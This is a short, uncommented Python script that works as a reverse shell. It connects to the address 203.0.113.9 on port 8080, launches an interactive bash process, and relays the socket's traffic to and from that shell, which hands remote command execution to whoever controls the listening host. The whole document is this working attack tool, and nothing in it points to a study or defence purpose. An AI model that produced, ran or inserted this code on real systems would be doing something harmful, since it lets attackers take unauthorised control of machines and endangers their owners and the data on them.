import os, select, socket, subprocess
def relay(peer, child):
    while True:
        ready, _, _ = select.select([peer, child.stdout], [], [], 60)
        for s in ready:
            buf = s.recv(4096) if s is peer else os.read(s.fileno(), 4096)
            if not buf:
                return
            if s is peer:
                child.stdin.write(buf); child.stdin.flush()
            else:
                peer.sendall(buf)
def main():
    peer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    peer.connect(("203.0.113.9", 8080))
    child = subprocess.Popen(["/bin/bash", "-i"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    relay(peer, child)
main()
